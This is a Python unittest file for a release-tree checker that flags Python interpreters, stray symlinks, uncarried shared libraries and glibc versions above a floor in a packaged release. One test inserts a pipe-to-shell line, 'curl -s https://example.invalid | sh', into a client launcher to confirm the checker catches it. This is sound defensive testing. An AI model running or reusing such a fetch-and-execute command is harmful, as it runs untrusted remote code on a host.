"""tools/runpath_check.py: the tree passes; each kind of Python on the path fails."""
from __future__ import annotations

import io
import os
from pathlib import Path
import shutil
import struct
import sys
import tempfile
import unittest
from contextlib import redirect_stderr, redirect_stdout

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "tools"))
import runpath_check  # noqa: E402


def elf_with_needed(names: list[str], symbols: list[tuple[str, str]] = ()) -> bytes:
    """A minimal ELF64LE object: section 1 dynamic (DT_NEEDED...), section 2 its
    strtab; with SYMBOLS ((name, version) pairs), sections 3 to 5 are the
    undefined dynamic symbols, their .gnu.version indices and one DT_VERNEED
    entry (libc.so.6) naming each version."""
    strtab = b"\0"

    def string(text: str) -> int:
        nonlocal strtab
        offset = len(strtab)
        strtab += text.encode() + b"\0"
        return offset

    offsets = [string(name) for name in names]
    dynamic = b"".join(struct.pack("<qQ", 1, off) for off in offsets) + struct.pack("<qQ", 0, 0)
    versions = sorted({version for _name, version in symbols})
    index = {version: 2 + i for i, version in enumerate(versions)}
    dynsym = bytes(24) + b"".join(struct.pack("<IBBHQQ", string(name), 0x12, 0, 0, 0, 0)
                                  for name, _version in symbols)
    versym = struct.pack("<H", 0) + b"".join(struct.pack("<H", index[version])
                                              for _name, version in symbols)
    verneed = b""
    if versions:
        verneed = struct.pack("<HHIII", 1, len(versions), string("libc.so.6"), 16, 0)
        for i, version in enumerate(versions):
            last = i == len(versions) - 1
            verneed += struct.pack("<IHHII", 0, 0, index[version], string(version), 0 if last else 16)
    header_size = 64
    blobs = [dynamic, strtab, dynsym, versym, verneed] if symbols else [dynamic, strtab]
    offsets_of, cursor = [], header_size
    for blob in blobs:
        offsets_of.append(cursor)
        cursor += len(blob)
    sh_off = cursor
    count = 1 + len(blobs)
    ident = b"\x7fELF" + bytes([2, 1, 1]) + bytes(9)
    header = ident + struct.pack("<HHIQQQIHHHHHH", 3, 62, 1, 0, 0, sh_off, 0, 64, 0, 0, 64, count, 0)

    def section(sh_type, offset, size, link):
        return struct.pack("<IIQQQQIIQQ", 0, sh_type, 0, 0, offset, size, link, 0, 8, 0)

    types = [(6, 2), (3, 0), (11, 2), (0x6FFFFFFF, 3), (0x6FFFFFFE, 2)]
    sections = section(0, 0, 0, 0) + b"".join(
        section(sh_type, off, len(blob), link)
        for (sh_type, link), off, blob in zip(types, offsets_of, blobs))
    return header + b"".join(blobs) + sections


class RunpathCheckTests(unittest.TestCase):
    def run_main(self, argv):
        out, err = io.StringIO(), io.StringIO()
        with redirect_stdout(out), redirect_stderr(err):
            code = runpath_check.main(argv)
        return code, out.getvalue(), err.getvalue()

    def release(self, tmp: Path) -> Path:
        top = tmp / "fn-0123456789ab"
        (top / "bin").mkdir(parents=True)
        (top / "libexec/fn/runtime").mkdir(parents=True)
        (top / "libexec/fn/lib").mkdir(parents=True)
        (top / "share/fn/rc.d").mkdir(parents=True)
        (top / "libexec/fn/lib/libzstd.so.7.0").write_bytes(elf_with_needed(["libc.so.103.0"]))
        (top / "libexec/fn/lib/libsodium.so.11.1").write_bytes(elf_with_needed(["libc.so.103.0"]))
        (top / "libexec/fn/fn-host.core").write_bytes(
            b"\0" * 64 + b"libsodium.so\0libssl.so\0libfn-mldsa65.so\0"
            + "libcrypto.so.3".encode("utf-32-le") + b"\0" * 8)
        (top / "libexec/fn/lib/libfn-mldsa65.so").write_bytes(elf_with_needed(["libc.so.103.0"]))
        shutil.copy(ROOT / "packaging/fn", top / "bin/fn")
        os.chmod(top / "bin/fn", 0o755)
        launcher = runpath_check.freeze_launcher_template(ROOT)
        (top / "libexec/fn/fn-host").write_text(launcher)
        os.chmod(top / "libexec/fn/fn-host", 0o755)
        (top / "libexec/fn/runtime/sbcl").write_bytes(elf_with_needed(["libc.so.103.0", "libzstd.so.7.0"]))
        os.chmod(top / "libexec/fn/runtime/sbcl", 0o755)
        rc = (ROOT / "packaging/fn.rc.in").read_text().replace("@PREFIX@", "/usr/local/fn-0123456789ab")
        (top / "share/fn/rc.d/fn").write_text(rc)
        return top

    def test_static_tree_is_clean(self):
        code, out, err = self.run_main([])
        self.assertEqual(code, 0, err)
        self.assertIn("fnn-workflow-ion-run-helper", out)

    def test_release_tree_is_clean(self):
        with tempfile.TemporaryDirectory() as tmp:
            top = self.release(Path(tmp))
            code, out, err = self.run_main(["--tree", str(top)])
            self.assertEqual(code, 0, err)
            self.assertIn("libexec/fn/runtime/sbcl: ELF; needs libc.so.103.0 libzstd.so.7.0", out)
            self.assertIn("share/fn/rc.d/fn: starts /usr/local/fn-0123456789ab/bin/fn", out)
            self.assertIn("the system's: libcrypto.so.3 libssl.so", out)

    def assert_finding(self, top: Path, fragment: str):
        code, _out, err = self.run_main(["--tree", str(top)])
        self.assertEqual(code, 1, err)
        self.assertIn(fragment, err)

    def test_planted_python_symlink_fails(self):
        # HST-018's witness: a scratch copy with bin/python3 -> the system's.
        with tempfile.TemporaryDirectory() as tmp:
            top = self.release(Path(tmp))
            os.symlink("/usr/bin/python3", top / "bin/python3")
            self.assert_finding(top, "bin/python3: links to /usr/bin/python3")

    def test_symlink_leaving_the_release_fails(self):
        with tempfile.TemporaryDirectory() as tmp:
            top = self.release(Path(tmp))
            os.symlink("../../../../etc/ssl/libssl.so.3", top / "libexec/fn/lib/libssl.so.3")
            self.assert_finding(top, "links outside the release")

    def test_needed_library_not_carried_fails(self):
        with tempfile.TemporaryDirectory() as tmp:
            top = self.release(Path(tmp))
            (top / "libexec/fn/lib/libzstd.so.7.0").unlink()
            self.assert_finding(top, "DT_NEEDED libzstd.so.7.0 is neither carried")

    def runtime_needing(self, top: Path, symbols: list[tuple[str, str]]) -> None:
        (top / "libexec/fn/runtime/sbcl").write_bytes(
            elf_with_needed(["libc.so.103.0", "libzstd.so.7.0"], symbols))

    def test_glibc_need_at_the_floor_passes(self):
        # The floor itself (GLIBC_2.36) and an older three-part version pass,
        # and the note names the highest version the object needs.
        with tempfile.TemporaryDirectory() as tmp:
            top = self.release(Path(tmp))
            self.runtime_needing(top, [("strtol", "GLIBC_2.2.5"), ("memcpy", "GLIBC_2.3.4"),
                                       ("arc4random", "GLIBC_2.36")])
            code, out, err = self.run_main(["--tree", str(top)])
            self.assertEqual(code, 0, err)
            self.assertIn("libexec/fn/runtime/sbcl: ELF; needs libc.so.103.0 libzstd.so.7.0; "
                          "highest GLIBC_2.36 (floor GLIBC_2.36)", out)

    def test_glibc_need_above_the_floor_fails(self):
        # The AJ tarball's runtime (release-glibc-floor): one symbol, C23 strtol.
        with tempfile.TemporaryDirectory() as tmp:
            top = self.release(Path(tmp))
            self.runtime_needing(top, [("strtol", "GLIBC_2.2.5"),
                                       ("__isoc23_strtol", "GLIBC_2.38")])
            self.assert_finding(top, "libexec/fn/runtime/sbcl: needs __isoc23_strtol@GLIBC_2.38, "
                                     "above the release's floor GLIBC_2.36")

    def test_glibc_floor_is_one_constant_and_the_docs_cite_it(self):
        floor = ".".join(map(str, runpath_check.GLIBC_FLOOR))
        self.assertIn(f"glibc {floor} or later", (ROOT / "docs/install.md").read_text())
        self.assertIn(f"**Requirements (Linux): glibc {floor} or later**",
                      (ROOT / "docs/operator-internals.md").read_text())
        self.assertEqual(runpath_check.glibc_version("GLIBC_2.3.4"), (2, 3, 4))
        self.assertIsNone(runpath_check.glibc_version("GLIBC_PRIVATE"))

    def test_core_dlopen_name_not_carried_fails(self):
        with tempfile.TemporaryDirectory() as tmp:
            top = self.release(Path(tmp))
            with open(top / "libexec/fn/fn-host.core", "ab") as core:
                core.write("libpython3.12.so.1.0".encode("utf-32-le") + b"\0" * 4)
            self.assert_finding(top, "may dlopen libpython3.12.so.1.0")

    # PKT-723: the OpenBSD release carries libsodium.so.11.1, which OpenBSD's
    # ld.so finds for the core's libsodium.so; Linux's libsodium.so.23 in an
    # OpenBSD core is a name the release does not carry.
    def test_openbsd_tree_is_clean_under_its_platform(self):
        with tempfile.TemporaryDirectory() as tmp:
            top = self.release(Path(tmp))
            code, out, err = self.run_main(["--tree", str(top), "--platform", "openbsd"])
            self.assertEqual(code, 0, err)
            self.assertIn("runpath: platform openbsd", out)

    def test_linux_soname_in_an_openbsd_core_fails(self):
        with tempfile.TemporaryDirectory() as tmp:
            top = self.release(Path(tmp))
            with open(top / "libexec/fn/fn-host.core", "ab") as core:
                core.write(b"libsodium.so.23\0")
            code, _out, err = self.run_main(["--tree", str(top), "--platform", "openbsd"])
            self.assertEqual(code, 1, err)
            self.assertIn("may dlopen libsodium.so.23, which the release does not carry", err)

    def test_openbsd_resolves_only_major_minor_files(self):
        with tempfile.TemporaryDirectory() as tmp:
            top = self.release(Path(tmp))
            os.rename(top / "libexec/fn/lib/libsodium.so.11.1", top / "libexec/fn/lib/libsodium.so.23")
            code, _out, err = self.run_main(["--tree", str(top), "--platform", "openbsd"])
            self.assertEqual(code, 1, err)
            self.assertIn("may dlopen libsodium.so, which the release does not carry", err)
        carried = {"libsodium.so.11.1"}
        self.assertTrue(runpath_check.carried_satisfies("libsodium.so", carried, "openbsd"))
        self.assertTrue(runpath_check.carried_satisfies("libsodium.so.11", carried, "openbsd"))
        self.assertFalse(runpath_check.carried_satisfies("libsodium.so.23", carried, "openbsd"))
        self.assertTrue(runpath_check.carried_satisfies("libsodium.so.23", {"libsodium.so.23.3.0"}, "linux"))

    def test_openbsd_libraries_are_not_linux_libc(self):
        with tempfile.TemporaryDirectory() as tmp:
            top = self.release(Path(tmp))
            self.assert_platform_finding(top, "linux", "DT_NEEDED libc.so.103.0 is neither carried")

    def assert_platform_finding(self, top, platform, fragment):
        code, _out, err = self.run_main(["--tree", str(top), "--platform", platform])
        self.assertEqual(code, 1, err)
        self.assertIn(fragment, err)

    def test_candidate_lists_must_be_read_time(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            for rel in runpath_check.LIB_SOURCES:
                (root / rel).parent.mkdir(parents=True, exist_ok=True)
                shutil.copy(ROOT / rel, root / rel)
            findings = runpath_check.Findings()
            runpath_check.scan_libraries(root, findings)
            self.assertEqual(findings.problems, [])
            crypto = root / "host/native/crypto.lisp"
            crypto.write_text(crypto.read_text().replace(
                "#+linux '(\"libsodium.so.23\"",
                "((member :linux *features*) '(\"libsodium.so.23\""))
            findings = runpath_check.Findings()
            runpath_check.scan_libraries(root, findings)
            self.assertTrue(any("fnn-crypto-library-candidates names libsodium.so.23 without a "
                                "read-time platform conditional" in p for p in findings.problems),
                            findings.problems)

    def test_arithmetic_expansion_runs_no_command(self):
        # packaging/fn's heap step: `$(( (core_octets + 1048575) / 1048576 + 128 ))'.
        self.assertEqual(runpath_check.split_commands(
            "boot=$(( (core_octets + 1048575) / 1048576 + 128 ))"), [])
        self.assertEqual(runpath_check.split_commands(
            "n=$(( 1 + 2 )); /usr/local/bin/helper $(( n / 2 ))"), ["/usr/local/bin/helper"])

    def test_absolute_command_outside_the_release_fails(self):
        with tempfile.TemporaryDirectory() as tmp:
            top = self.release(Path(tmp))
            text = (top / "bin/fn").read_text().replace(
                'exec "$image" --fn "$@"', '/usr/local/bin/helper\nexec "$image" --fn "$@"')
            (top / "bin/fn").write_text(text)
            self.assert_finding(top, "runs /usr/local/bin/helper, outside the release")

    def test_python_shebang_fails(self):
        with tempfile.TemporaryDirectory() as tmp:
            top = self.release(Path(tmp))
            (top / "libexec/fn/helper").write_text("#!/usr/bin/env python3\nprint(1)\n")
            code, _, err = self.run_main(["--tree", str(top)])
            self.assertEqual(code, 1)
            self.assertIn("libexec/fn/helper: interpreter /usr/bin/env python3", err)

    def test_python_command_in_launcher_fails(self):
        with tempfile.TemporaryDirectory() as tmp:
            top = self.release(Path(tmp))
            text = (top / "bin/fn").read_text().replace('exec "$image"', 'python3 -c pass\nexec "$image"')
            (top / "bin/fn").write_text(text)
            code, _, err = self.run_main(["--tree", str(top)])
            self.assertEqual(code, 1)
            self.assertIn("bin/fn: runs python3", err)

    def test_libpython_needed_fails(self):
        with tempfile.TemporaryDirectory() as tmp:
            top = self.release(Path(tmp))
            (top / "libexec/fn/runtime/sbcl").write_bytes(elf_with_needed(["libpython3.13.so.1.0"]))
            code, _, err = self.run_main(["--tree", str(top)])
            self.assertEqual(code, 1)
            self.assertIn("DT_NEEDED libpython3.13.so.1.0", err)

    def test_python_source_fails(self):
        with tempfile.TemporaryDirectory() as tmp:
            top = self.release(Path(tmp))
            (top / "share/fn/probe.py").write_text("print(1)\n")
            code, _, err = self.run_main(["--tree", str(top)])
            self.assertEqual(code, 1)
            self.assertIn("share/fn/probe.py: Python source", err)

    def test_service_starting_python_fails(self):
        with tempfile.TemporaryDirectory() as tmp:
            top = self.release(Path(tmp))
            rc = (top / "share/fn/rc.d/fn").read_text().replace(
                'daemon="/usr/local/fn-0123456789ab/bin/fn"', 'daemon="/usr/local/bin/python3"')
            (top / "share/fn/rc.d/fn").write_text(rc)
            code, _, err = self.run_main(["--tree", str(top)])
            self.assertEqual(code, 1)
            self.assertIn("starts /usr/local/bin/python3", err)

    # ------------------------------------------------ clients/ (the web reader)

    def with_clients(self, top: Path) -> Path:
        """The clients/ packaging/install-clients.sh stages, beside the node."""
        clients = top / "clients"
        (clients / "bin").mkdir(parents=True)
        (clients / "lib").mkdir()
        (clients / "share/rc.d").mkdir(parents=True)
        for name in ("fn_reader", "fn_client", "nntp_session"):
            (clients / "lib" / (name + ".py")).write_text("print(1)\n")
        for name in ("fn-reader", "fn-client"):
            shutil.copy(ROOT / "packaging/fn-client-launcher", clients / "bin" / name)
            os.chmod(clients / "bin" / name, 0o755)
        (clients / "share/rc.d/fn_reader.rc.in").write_text(
            (ROOT / "packaging/fn_reader.rc.in").read_text())
        (clients / "README.txt").write_text("clients\n")
        return top

    def test_clients_pass_under_their_own_rule(self):
        # The reader is Python, in clients/; the node's path stays Python-free.
        with tempfile.TemporaryDirectory() as tmp:
            top = self.with_clients(self.release(Path(tmp)))
            code, out, err = self.run_main(["--tree", str(top)])
            self.assertEqual(code, 0, err)
            self.assertIn("clients/: 3 Python programs", out)
            self.assertIn("clients/bin/fn-reader: client launcher; commands: readlink dirname "
                          "basename tr python3", out)
            self.assertIn("clients/share/rc.d/fn_reader.rc.in: starts "
                          "@PREFIX@/clients/bin/fn-reader", out)
            self.assertIn("no Python on the deployed path", out)

    def test_node_service_starting_a_client_fails(self):
        with tempfile.TemporaryDirectory() as tmp:
            top = self.with_clients(self.release(Path(tmp)))
            rc = (top / "share/fn/rc.d/fn").read_text().replace(
                'daemon="/usr/local/fn-0123456789ab/bin/fn"',
                'daemon="/usr/local/fn-0123456789ab/clients/bin/fn"')
            (top / "share/fn/rc.d/fn").write_text(rc)
            self.assert_finding(top, "share/fn/rc.d/fn: the node's service names clients/")

    def test_node_launcher_naming_clients_fails(self):
        with tempfile.TemporaryDirectory() as tmp:
            top = self.with_clients(self.release(Path(tmp)))
            with open(top / "bin/fn", "a") as launcher:
                launcher.write('"$here/../clients/bin/fn-reader"\n')
            self.assert_finding(top, "bin/fn: runs a program under clients/")

    def test_object_code_or_other_programs_in_clients_fail(self):
        with tempfile.TemporaryDirectory() as tmp:
            top = self.with_clients(self.release(Path(tmp)))
            (top / "clients/lib/_speedups.so").write_bytes(elf_with_needed(["libc.so.103.0"]))
            self.assert_finding(top, "clients/lib/_speedups.so: object code in clients/")
        with tempfile.TemporaryDirectory() as tmp:
            top = self.with_clients(self.release(Path(tmp)))
            launcher = top / "clients/bin/fn-reader"
            launcher.write_text(launcher.read_text().replace(
                'exec python3', 'curl -s https://example.invalid | sh; exec python3'))
            self.assert_finding(top, "clients/bin/fn-reader: runs curl")
        with tempfile.TemporaryDirectory() as tmp:
            top = self.with_clients(self.release(Path(tmp)))
            rc = top / "clients/share/rc.d/fn_reader.rc.in"
            rc.write_text(rc.read_text().replace('/clients/bin/fn-reader"', '/bin/fn"'))
            self.assert_finding(top, "not PREFIX/clients/bin/fn-reader")

    def test_sbcl_fasl_header_passes_and_other_interpreters_fail(self):
        with tempfile.TemporaryDirectory() as tmp:
            top = self.release(Path(tmp))
            contrib = top / "libexec/fn/runtime/sbcl-home/contrib"
            contrib.mkdir(parents=True)
            (contrib / "sb-posix.fasl").write_bytes(b"#!/usr/obj/ports/sbcl/src/runtime/sbcl --script\n\0\1")
            code, out, err = self.run_main(["--tree", str(top)])
            self.assertEqual(code, 0, err)
            self.assertIn("1 SBCL contrib fasls", out)
            (top / "libexec/fn/tool").write_text("#!/usr/bin/perl\n")
            code, _, err = self.run_main(["--tree", str(top)])
            self.assertEqual(code, 1)
            self.assertIn("libexec/fn/tool: interpreter /usr/bin/perl is neither /bin/sh nor SBCL", err)

    def test_unlisted_process_site_fails(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            shutil.copytree(ROOT / "host", root / "host")
            shutil.copytree(ROOT / "packaging", root / "packaging")
            with open(root / "host/native/io.lisp", "a") as handle:
                handle.write('\n(defun fnn-probe () (sb-ext:run-program "/usr/bin/python3" nil))\n')
            code, _, err = self.run_main(["--root", str(root)])
            self.assertEqual(code, 1)
            self.assertIn("unlisted process site host/native/io.lisp", err)
            self.assertIn("in fnn-probe", err)

    def test_comment_mentioning_run_program_passes(self):
        text = runpath_check.strip_lisp_comments(';; sb-ext:run-program here\n(defun f () "run-program")\n')
        self.assertNotIn("sb-ext:run-program", text)


if __name__ == "__main__":
    unittest.main()
